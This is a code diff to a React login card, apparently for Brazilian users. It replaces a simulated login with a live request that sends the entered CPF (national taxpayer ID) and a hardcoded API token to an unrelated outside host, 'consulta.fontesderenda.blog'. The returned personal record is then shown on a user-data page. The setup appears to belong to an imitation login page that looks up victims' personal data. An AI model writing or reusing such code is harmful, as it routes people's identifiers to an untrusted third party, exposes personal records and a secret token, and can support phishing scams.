@@ -1,5 +1,6 @@
 
 import React, { useState } from 'react';
+import { useNavigate } from 'react-router-dom';
 import { Button } from "@/components/ui/button";
 import { ArrowRight, DollarSign, QrCode, Key, Cloud, HelpCircle } from "lucide-react";
 import CPFInput from './CPFInput';
@@ -13,13 +14,14 @@ const LoginCard: React.FC<LoginCardProps> = ({ className }) => {
   const [cpf, setCpf] = useState('');
   const [isValid, setIsValid] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const navigate = useNavigate();
 
   const handleValidate = (valid: boolean, value: string) => {
     setIsValid(valid);
     setCpf(value);
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!isValid) {
@@ -29,12 +31,37 @@ const LoginCard: React.FC<LoginCardProps> = ({ className }) => {
     
     setIsLoading(true);
     
-    // Simulação de autenticação
-    setTimeout(() => {
-      toast.success('CPF validado com sucesso!');
+    // Remove any non-digit characters from CPF
+    const cleanCpf = cpf.replace(/\D/g, '');
+    
+    try {
+      // Make the API call to fetch user data
+      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=f29edd8e-9a7c-45c1-bbfd-5c7ecf469fca&cpf=${cleanCpf}`);
+      
+      if (!response.ok) {
+        throw new Error('Falha na consulta. Status: ' + response.status);
+      }
+      
+      const data = await response.json();
+      
+      if (data.DADOS) {
+        // Add the CPF to the user data
+        const userData = {
+          ...data.DADOS,
+          cpf: cleanCpf
+        };
+        
+        // Navigate to the user data page with the fetched data
+        navigate('/user-data', { state: { userData } });
+      } else {
+        toast.error('Não foram encontrados dados para este CPF.');
+      }
+    } catch (error) {
+      console.error('Erro na consulta:', error);
+      toast.error('Ocorreu um erro ao consultar o CPF. Por favor, tente novamente.');
+    } finally {
       setIsLoading(false);
-      // Aqui seria a navegação para a próxima etapa
-    }, 1500);
+    }
   };
 
   return (
